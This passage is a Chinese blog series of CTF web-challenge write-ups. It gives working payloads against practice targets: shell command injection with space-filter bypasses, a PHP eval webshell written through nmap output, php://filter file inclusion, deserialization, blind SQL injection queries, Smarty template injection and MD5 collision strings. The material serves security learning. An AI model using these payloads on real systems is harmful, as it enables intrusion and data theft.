+<p>题目给出了一个路由 <code>/geneSign</code> 用来生成 <code>sign</code>，需要的是 <code>action</code> 和 <code>param</code>，但是这里的 <code>action</code> 被固定了，不好下手。跟着代码来到 <code>getSign()</code>，发现了拼接 <code>secert_key + param + action</code>，于是只要把原本请求里的 <code>param</code> 构造成 <code>flag.txtread</code> 就能生成对应的可用 <code>sign</code> 了。</p>
+<p>将生成的 <code>sign</code> 跟上述的两个参数一起以对应的形式向 <code>/Delta</code> 发起请求即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4b706878-1516-4a40-9aea-1f393a4b1650&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>按照很简洁的提示 <code>/?ip=</code> 试了一波，发现加上分号之后可以执行更多命令。于是试了一波 <code>ls</code>，发现了 flag.php，只要想办法读它就行了。试了一下之后发现 flag 和 空格都被 ban 了。于是查了一波，发现 <code>$IFS$2</code> 可以用来代替空格。加上可以使用变量来代替 flag 里的一部分字符，就可以构造出 <code>o=g;cat$IFS$2fla$o.php</code>。发送请求之后查看网页源码即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY(1_sh0uld_ban_Icmp_4tFirst)</span><br></pre></td></tr></table></figure>
+
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>开局一段代码，都是老套路，构造 <code>text=data://text/plain,welcome to the zjctf</code> 过掉判断，然后再构造 <code>file=php://filter/convert.base64-encode/resource=useless.php</code> 读取一下 useless.php。Base64 解码之后得到 useless.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>这波挺简单，放到 IDE 里随便序列化一下，得到 <code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 之后放进参数 <code>password</code> 里。然后发起请求（x <span class="heimu" title="真是的，细心一点嘛">这里不对呐~</span></p>
+<p>因为还要加载 useless.php 反序列化才能起效果，所以要修改原来 php 伪协议的构造，最后构造出 <code>.../?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 得到一串 base64 字符串，解码后得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8e991b07-be12-4339-9fbc-e895b87b9bc2&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>这波是简单题，看一下 url 之后构造简单的文件包含 <code>.../?file=php://filter/convert.base64-encode/resource=flag.php</code>。将内容 base64 解码后得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ad315b-01ff-4d4e-9560-635a28d81a17&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>这波也是简单题，直接一个 <code>&amp;</code> 连接命令,构造 <code>114.114.114.114 &amp; cat /flag</code>，就能输出 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3cb2f161-aed1-423f-9eed-c93fa2fc2328&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>本来准备留到后面写这题的，但是跟<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>讨论的时候他跟我透露了是源码泄露，所以干脆就先写一写。既然标题是 Easy Java，加上拿到的资料，在看到题目给出的 help 的 url 之后果断构造下载一波 <code>WEB-INF/web.xml</code>。不过仍然遇到了点问题，需要使用 POST 请求才能下载到文件。下载下来之后发现有一个 <code>com.wm.ctf.FlagController</code>，于是再构造一波 <code>WEB-INF/classes/com/wm/ctf/FlagController.class</code> 来下载这个文件。下载之后打开来我一时懵了，毕竟是编译过的东西，所以看起来乱七八糟，愣是没发现有段 base64。不过问题不大，把 base64 字符串解码之后就是 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;db7dab97-1cd7-48ad-b991-66ec0c3dc816&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>啊，这题开门见山，给了一段代码，一看就不简单（bushi）。稍微一看就知道，传入一个参数，两道过滤之后执行，利用点肯定在 <code>nmap</code> 指令。于是就去查一波这个指令的手册，可以看到这样一条允许我们直接写如文件的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.</span><br></pre></td></tr></table></figure>
+
+<p>同时 <code>sandbox</code> 的路径会在成功之后输出。因此，想办法写入一句话然后用蚁剑去连上就行啦。</p>
+<p>先来看看 <code>nmap</code>，使用上面的那个参数，构造 <code>nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&#39; -oG pick.php</code> 尝试，得到一个 pick.php 文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Tue Apr 28 01:07:48 2020 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG pick.php &quot;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># Nmap done at Tue Apr 28 01:07:48 2020 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现语句已经完整地写入进去了。再看过滤的那两个函数，根据 PHP 手册的说明，<code>escapeshellarg()</code> 这个函数会转义所有引号然后用引号包起来，同时在字符串两端加上引号。<code>escapeshellcmd()</code> 会在部分字符前加上 <code>\</code>。<span class="HighlightWKT7BlueGreen">（在 Windows 下会有所不同，建议使用 Linux 环境尝试。）</span>因此，先假定整个 payload 为 <code>A</code>，正常来说它会被 <code>escapeshellarg()</code> 变成 <code>&#39;A&#39;</code>。如果我们在 <code>A</code> 前后再加上一个单引号，就会变成 <code>&#39;&#39;\&#39;&#39;A&#39;\&#39;&#39;&#39;</code>，这个时候因为有反斜杠转义，所以这个 payload 还是不太对。但是 <code>escapeshellcmd()</code> 的出现是一个助攻，它会在反斜杠前加个反斜杠转义，那 payload 就成了 <code>&#39;&#39;\\&#39;&#39;A&#39;\\&#39;&#39;&#39;</code>，这个时候，所有引号闭合，A 暴露在语句中，执行写入就成功了。用蚁剑连上去即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2fba51b2-2f0b-42b4-ac84-144f7c7b39e3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>这题首先提示备份和 <code>source file</code>，略微找一下不难找到（实在找不到就扫描器嘛）index.php.bak。审计一波可以发现 <code>$key = intval($key);</code> 把 <code>$key</code> 坐实成整数了，然后把整数和字符串相比，那字符串就会被截断了，所以这个地方的 <code>$str</code> 最后是 123。所以，只需要使传入的参数值为 123 即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30d4e82b-b8b5-42ea-aaec-fb00ad067bad&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>这题不知道为啥，上来报了个错。（写完了题目之后发现并没有用  一顿倒腾之后可以发现 robots.txt 的存在，然后根据线索访问到 fAke_f1agggg.php。这个页面一定有线索，排查之后发现响应里有 <code>Look_at_me: /fl4g.php</code>，访问一波，来到了最后亿步的页面。</p>
+<p>首先是 <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> 这个点，查了一波之后发现了神奇操作，<code>intval</code> 的返回值在大于 2147483647 之后会变得奇奇怪怪，试了一波，以字符串传入科学计数法也会被截断，但是当加上一个数字之后又正常了，所以，整个 <code>1e4</code> 构造一句 <code>echo (intval(&quot;1e4&quot;) &lt; 2020 &amp;&amp; intval(&quot;1e4&quot; + 1) &gt; 2021)?&quot;true&quot;:&quot;false&quot;;</code> 试试看，很巧的是在 php 5.6 下，这句会返回 <code>true</code> 而 php 7.2 下返回的是 false。原因是 <code>intval(&quot;1e4&quot;)</code> 在 php 7.2 下不会再被截断而正常转化。</p>
+<p>接着的点是 <code>$md5==md5($md5)</code>，这就很有意思了，好在它是个弱比较，于是很容易想到用科学计数法的套路，于是写个脚本跑一下（期间的时间足够泡完一杯咖啡再喝上两口），找到 <code>0e215962017</code> 的 MD5 也以 0e 开头，于是这个点达成。</p>
+<p>最后是两个小点，空格的过滤用 <code>$IFS$2</code> 绕过，<code>cat</code> 不给用就用 <code>tac</code>。但是，在这之前得先读个目录，毕竟题目没说 flag 在哪。于是首先构造 <code>.../fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</code> 得到 flag 所在，然后再构造 <code>/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$2fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;s1mple_php_1s_v3ry_e@sy_and_here_1s_y0ur_stupid_flag_wish_u_h@ve_@_go0d_time_enj0y_1t&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p>朴实无华的界面又报了两个错，不过依旧没什么用。回过头来看查询，那应该是数据库操作了。稍微试了一手之后发现是 GET 参数与输入框的对应，猜测一波查询语句可能是 <code>SELECT SCORE FROM TABLE WHERE ID=</code>，于是尝试布尔盲注，构造一波 <code>if((ascii(substr((select(database())),1,1))&lt;1),1,0)</code> 检测发现大于 1 和小于 1 的时候分别对应 <code>Hi admin, your score is: 100</code> 和 <code>student number not exists.</code>。于是拿出之前的二分法模板，稍作修改就可以用了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆列</span><br><span class="line">if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆 flag</span><br><span class="line">if((ascii(substr((select(value)from(flag)),1,1))&gt;1),1,0)</span><br></pre></td></tr></table></figure>
+
+<p>这里又出现了常规操作，真的 flag 不在 flag 里反而在 value 里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>这题上来给了俩接口，暗示 X-Forwarded-For，然后当前 IP 会在页面上显示，于是想到了模板注入，试了一手之后发现真的是，而且是 Smarty。一番查找之后找到了<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl">参考</a>。于是果断构造 <code>&#123;if print_r(file_get_contents('/flag'))&#125;&#123;/if&#125;</code>，放到 X-Forwarded-For 的位置请求。之后在页面源码中可以找到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;291d99ce-2668-4b27-bc1a-da2c4aa567e2&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">FileInclusion</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">fastcoll</span></p>
+<p>题目的页面一打开就显示了两张图，很不一样的是有一张是 Base64 嵌入在网页里的，这种做法一般比较少。于是看了一眼 url，发现有两个参数，其中的 <code>img</code> 给的很像是 Base64 编码。于是尝试补全等号然后解码，发现更像了，于是再解密了一次，得到了 <code>3535352e706e67</code>。看起来像 hex，尝试解码后果然得到了线索 <code>555.png</code>。于是便想到包含文件。把 <code>index.php</code> 一顿操作之后得到了页面源码（这里截取 php 部分）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>观察到可以执行的点是参数 <code>cmd</code>，但是正则过滤十分苛刻。这里有一个点，对于 php 来说，正则需要使用 <code>\\\</code> 来匹配才能匹配到反斜杠，所以实际上反斜杠还能用。在一番查找下，我找到了另外一个可以用的指令 <code>sort</code>。于是这部分就有了两种解决方法。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fla\g</span><br><span class="line">sort /flag</span><br></pre></td></tr></table></figure>
+
+<p>剩下的就是 MD5 碰撞的问题。一番查找之下，我找到了一个生成 MD5 碰撞字符串的工具。生成好之后把字符串分别 urlencode 之后组合成 POST 参数，使用 Burpsuite 发送请求（HackBar 依旧没有成功）。有一个比较神奇的点是，我在把 POST 请求最后的换行符去掉之后才请求成功的。有可能是这个原因导致使用 HackBar 无法成功得到 flag。</p>
+<p>这里贴上我使用的两个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%91r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%1E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%8A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5DHd%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%0C%1B%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AE%D0%A6%09Q%2B&amp;b&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%11r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%9E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%0A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5D%C8d%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%8C%1A%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AEP%A6%09Q%2B</span><br></pre></td></tr></table></figure>
+
+<p>准确无误地发送封包之后可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f9dccbe4-f6d1-4928-9904-fc1e1d39944d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Session</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span></p>
+<p>题目开始就只有一句话，Header 和 Cookie 也没得线索，于是果断扫目录，发现 <code>/.git</code> 响应长度不一样。于是果断上 GitHack 拿到了首页源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>啊，看这正则过滤，多么美妙，真实的一个参数都不给你。不过不慌，我可是搜过半小时相关知识点的萌新。先构造个 <code>scandir(current(localeconv()))</code> 看一下根目录有啥。这里的原理就是 <code>localeconv()</code> 输出的数组中第一个一定是一个 <code>.</code>。根据结果发现 flag.php 在根目录。于是就得想办法读取它啦，但是它不在数组的第一个，有两种办法来读到它。把数组反过来然后整个 <code>next()</code>，也就是  <code>highlight_file(next(array_reverse(scandir(pos(localeconv())))))</code>。或者简单粗暴，整个 flip 和 rand <code>readfile(array_rand(array_flip(scandir(current(localeconv())))))</code> 不停地刷新，就能刷到啦。</p>
+<p>我还查到了一种神奇的做法，利用 session 来完成。首先在 Console 里面执行 <code>document.cookie=&quot;PHPSESSID=flag.php&quot;</code> 指定 SessionId。然后 exp 写 <code>show_source(session_id(session_start()));</code> 就能成功读到 flag.php 从而拿到 flag 了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5f914f8d-550d-4c3a-bdae-345f50997b0d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">githacker</span></p>
